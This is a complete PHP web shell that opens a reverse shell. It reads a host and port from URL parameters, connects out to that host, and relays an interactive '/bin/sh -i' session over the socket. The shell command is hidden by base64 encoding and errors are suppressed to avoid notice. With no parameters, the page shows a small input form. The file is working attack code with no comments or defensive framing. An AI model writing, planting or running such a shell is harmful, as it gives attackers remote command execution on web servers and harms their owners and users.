<?php
@set_time_limit(0);
if (isset($_GET['ip']) && isset($_GET['port'])) {
    $h = $_GET['ip'];
    $p = $_GET['port'];
    if (!is_numeric($p) || $p < 1 || $p > 65535) {
        die("Err\n");
    }

    $cmd = base64_decode('L2Jpbi9zaCAtaQ=='); 
    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    if (($s = @fsockopen($h, $p)) !== false) {
        $proc = @proc_open($cmd, $spec, $pipes);
        if (is_resource($proc)) {
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            stream_set_blocking($s, 0);
            while (1) {
                $r = [$s, $pipes[1], $pipes[2]];
                stream_select($r, $w = null, $e = null, null);
                if (in_array($s, $r)) { fwrite($pipes[0], fread($s, 2048)); }
                if (in_array($pipes[1], $r)) { fwrite($s, fread($pipes[1], 2048)); }
                if (in_array($pipes[2], $r)) { fwrite($s, fread($pipes[2], 2048)); }
            }
            fclose($s); proc_close($proc);
        }
    }
} else {
    echo '<form method="get"><input name="ip" placeholder="Host" required><input name="port" type="number" placeholder="Port" required><button>Go</button></form>';
}
?>
